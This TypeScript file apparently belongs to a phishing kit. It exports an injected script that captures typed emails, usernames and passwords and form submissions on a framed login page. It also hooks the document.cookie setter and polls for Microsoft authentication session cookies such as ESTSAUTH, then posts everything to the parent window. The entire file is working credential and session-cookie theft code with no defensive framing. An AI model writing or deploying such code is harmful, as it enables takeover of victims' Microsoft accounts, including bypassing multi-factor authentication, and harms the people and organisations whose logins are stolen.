/**
 * Enhanced Password Capture Injector with Microsoft Cookie Monitoring
 * Captures credentials and monitors for Microsoft authentication cookies
 */

export function injectPasswordCaptureScript() {
  // Prevent multiple injections
  if (window.__passwordCaptureInjected) {
    return;
  }
  window.__passwordCaptureInjected = true;

  console.log('🔧 Initializing enhanced password capture and cookie monitoring...');

  // Enhanced credential capture with multiple detection methods
  function captureCredentials() {
    const forms = document.querySelectorAll('form');
    const emailInputs = document.querySelectorAll('input[type="email"], input[name*="email"], input[id*="email"], input[placeholder*="email"]');
    const passwordInputs = document.querySelectorAll('input[type="password"], input[name*="password"], input[id*="password"]');
    const usernameInputs = document.querySelectorAll('input[name*="username"], input[id*="username"], input[name*="user"]');

    // Monitor all relevant inputs
    [...emailInputs, ...passwordInputs, ...usernameInputs].forEach(input => {
      if (input.__captureListenerAdded) return;
      input.__captureListenerAdded = true;

      ['input', 'change', 'blur', 'keyup'].forEach(eventType => {
        input.addEventListener(eventType, () => {
          setTimeout(() => {
            const email = getFieldValue(emailInputs) || getFieldValue(usernameInputs);
            const password = getFieldValue(passwordInputs);
            const username = getFieldValue(usernameInputs);

            if (email || password || username) {
              const credentialsData = {
                email: email || '',
                password: password || '',
                username: username || '',
                domain: window.location.hostname,
                url: window.location.href,
                captureTime: new Date().toISOString(),
                source: 'injected-capture'
              };

              // Store in multiple locations for reliability
              try {
                localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
                sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
              } catch (e) {
                console.warn('Failed to store credentials:', e);
              }

              // Send to parent window
              try {
                window.parent.postMessage({
                  type: 'CREDENTIALS_CAPTURED',
                  data: credentialsData
                }, '*');
              } catch (e) {
                console.warn('Failed to send credentials to parent:', e);
              }

              console.log('🔐 Credentials captured:', {
                hasEmail: !!email,
                hasPassword: !!password,
                hasUsername: !!username,
                source: 'injected-capture'
              });
            }
          }, 100);
        });
      });
    });

    // Monitor form submissions
    forms.forEach(form => {
      if (form.__submitListenerAdded) return;
      form.__submitListenerAdded = true;

      form.addEventListener('submit', (e) => {
        setTimeout(() => {
          const formData = new FormData(form);
          const email = formData.get('email') || formData.get('username') || formData.get('login');
          const password = formData.get('password') || formData.get('pass');

          if (email || password) {
            const credentialsData = {
              email: email?.toString() || '',
              password: password?.toString() || '',
              domain: window.location.hostname,
              url: window.location.href,
              captureTime: new Date().toISOString(),
              source: 'form-submission'
            };

            try {
              localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
              sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
              
              window.parent.postMessage({
                type: 'CREDENTIALS_CAPTURED',
                data: credentialsData
              }, '*');
            } catch (e) {
              console.warn('Failed to process form submission:', e);
            }
          }
        }, 50);
      });
    });
  }

  // Enhanced cookie monitoring for Microsoft authentication
  function monitorMicrosoftCookies() {
    const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
    
    if (originalCookieDescriptor) {
      Object.defineProperty(document, 'cookie', {
        get() {
          return originalCookieDescriptor.get.call(this);
        },
        set(value) {
          // Monitor for Microsoft authentication cookies
          if (value && (
            value.includes('ESTSAUTH') ||
            value.includes('ESTSAUTHPERSISTENT') ||
            value.includes('ESTSAUTHLIGHT') ||
            value.includes('SignInStateCookie') ||
            value.includes('AADSTS') ||
            value.includes('buid') ||
            value.includes('x-ms-gateway-slice') ||
            value.includes('stsservicecookie')
          )) {
            console.log('🍪 Microsoft authentication cookie detected:', value.split('=')[0]);
            
            // Capture all current cookies
            setTimeout(() => {
              captureMicrosoftCookies();
            }, 500);
          }
          
          return originalCookieDescriptor.set.call(this, value);
        },
        configurable: true
      });
    }

    // Periodic cookie monitoring
    setInterval(() => {
      const cookies = document.cookie;
      if (cookies && (
        cookies.includes('ESTSAUTH') ||
        cookies.includes('SignInStateCookie') ||
        cookies.includes('buid')
      )) {
        captureMicrosoftCookies();
      }
    }, 2000);
  }

  // Capture Microsoft cookies function
  function captureMicrosoftCookies() {
    try {
      const cookies = document.cookie.split(';').map(cookie => {
        const [name, ...valueParts] = cookie.trim().split('=');
        return {
          name: name.trim(),
          value: valueParts.join('='),
          domain: window.location.hostname,
          path: '/',
          secure: window.location.protocol === 'https:',
          sameSite: 'None',
          captureTime: new Date().toISOString()
        };
      }).filter(cookie => cookie.name && cookie.value);

      if (cookies.length > 0) {
        const cookieData = {
          cookies,
          domain: window.location.hostname,
          url: window.location.href,
          captureTime: new Date().toISOString(),
          source: 'cookie-monitor'
        };

        // Store cookies
        try {
          localStorage.setItem('captured_cookies', JSON.stringify(cookies));
          sessionStorage.setItem('captured_cookies', JSON.stringify(cookies));
        } catch (e) {
          console.warn('Failed to store cookies:', e);
        }

        // Send to parent window
        try {
          window.parent.postMessage({
            type: 'MICROSOFT_COOKIES_CAPTURED',
            data: cookieData
          }, '*');
        } catch (e) {
          console.warn('Failed to send cookies to parent:', e);
        }

        console.log('🍪 Microsoft cookies captured:', cookies.length);
      }
    } catch (error) {
      console.warn('Failed to capture Microsoft cookies:', error);
    }
  }

  // Helper function to get field values
  function getFieldValue(inputs) {
    for (const input of inputs) {
      if (input.value && input.value.trim()) {
        return input.value.trim();
      }
    }
    return '';
  }

  // Monitor for organizational sign-in
  function monitorOrganizationalSignIn() {
    const observer = new MutationObserver(() => {
      const orgElements = document.querySelectorAll('[data-test-id*="org"], [class*="organization"], [id*="organization"]');
      const emailElements = document.querySelectorAll('input[type="email"], [data-test-id*="email"]');
      
      orgElements.forEach(element => {
        if (element.textContent && element.textContent.includes('@')) {
          const email = element.textContent.match(/[\w.-]+@[\w.-]+\.\w+/)?.[0];
          if (email) {
            try {
              window.parent.postMessage({
                type: 'ORGANIZATIONAL_CREDENTIALS_CAPTURED',
                data: { email, source: 'organizational-detection' }
              }, '*');
            } catch (e) {
              console.warn('Failed to send organizational credentials:', e);
            }
          }
        }
      });
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true,
      characterData: true
    });
  }

  // Initialize all monitoring
  function initialize() {
    captureCredentials();
    monitorMicrosoftCookies();
    monitorOrganizationalSignIn();

    // Re-run credential capture when DOM changes
    const observer = new MutationObserver(() => {
      setTimeout(captureCredentials, 500);
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true
    });

    // Monitor for page navigation
    let currentUrl = window.location.href;
    setInterval(() => {
      if (window.location.href !== currentUrl) {
        currentUrl = window.location.href;
        setTimeout(() => {
          captureCredentials();
          captureMicrosoftCookies();
        }, 1000);
      }
    }, 1000);
  }

  // Start monitoring when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initialize);
  } else {
    initialize();
  }

  console.log('✅ Enhanced password capture and cookie monitoring initialized');
}

// Make it available globally for console debugging
if (typeof window !== 'undefined') {
  (window as any).injectPasswordCaptureScript = injectPasswordCaptureScript;
}
